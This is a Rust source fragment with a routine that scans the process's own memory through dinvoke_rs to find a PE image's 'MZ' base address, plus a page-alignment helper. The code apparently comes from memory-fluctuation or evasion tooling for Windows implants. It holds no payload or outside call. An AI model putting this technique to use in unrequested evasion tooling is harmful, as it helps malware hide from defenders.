
// The method used to locate the PE's base address consists on scanning the memory regions near the
// current function for the closest "MZ" header bytes. This is unreliable  
// because if they are not present, the nearest one would be chosen, which could be from
// another PE. Therefore a threshold representing the maximum number of memory
// regions to scan is set, as the header should be relatively close to the address.
fn get_pe_baseaddress (threshold: u32, pattern: [u8;2]) -> usize {
    unsafe
    {   
        let mut regions: Vec<(usize, usize)> = Vec::new();
        let mut regions_size: u32 = 0;

        let mut base_address: usize = 0;

        let b = vec![0u8; size_of::<SYSTEM_INFO>()];
        let si: *mut SYSTEM_INFO = std::mem::transmute(b.as_ptr());
        dinvoke_rs::dinvoke::get_system_info(si);

        let main_address = fluctuate as usize;

        let mut mem = 0usize;
        let max = (*si).lpMaximumApplicationAddress as usize;
        
        while mem < max
        {
            let buffer = vec![0u8; size_of::<MEMORY_BASIC_INFORMATION>()];
            let buffer: *mut MEMORY_BASIC_INFORMATION = std::mem::transmute(buffer.as_ptr());
            let length = size_of::<MEMORY_BASIC_INFORMATION>();
            let _r = dinvoke_rs::dinvoke::virtual_query_ex(
                GetCurrentProcess(), 
                mem as *const c_void, 
                buffer, 
                length
            );       

            let is_readable: bool = (*buffer).Protect.0 == PAGE_READONLY || (*buffer).Protect.0 == PAGE_READWRITE || (*buffer).Protect.0 == PAGE_EXECUTE_READ || (*buffer).Protect.0 == PAGE_EXECUTE_READWRITE;
            
            if is_readable
            {
                regions.push(((*buffer).BaseAddress as usize, (*buffer).RegionSize));
                regions_size += 1;

                if main_address >= ((*buffer).BaseAddress as usize) && main_address <= ((*buffer).BaseAddress as usize + (*buffer).RegionSize )
                {
                    break;
                }
                
            }
            mem = (*buffer).BaseAddress as usize + (*buffer).RegionSize;
        }

        let mut i: i32 = regions_size as i32 - 1;

        let mut threshold_c = threshold;
        while (i >= 0) && (threshold_c > 0) {

            let region = regions[i as usize];

            let t1: [u8;2] = pattern;
            let t1= t1.as_ptr();
            let t2 = region.0 as *const u8;

            if *(t1) == *(t2) {
                let t1 = t1.add(1);
                let t2 = t2.add(1);

                if *(t1) == *(t2) {
                    base_address = region.0 as usize;
                    break;
                }
            }
            i -= 1;
            threshold_c -= 1;
        }
        
        return base_address;
    }
}

fn align_to_mempage(vsize: usize) -> usize {
    if vsize % 4096 == 0 
    {
        return vsize;
    }
    else
    {
        return ((vsize / 4096) + 1) * 4096;
    }
}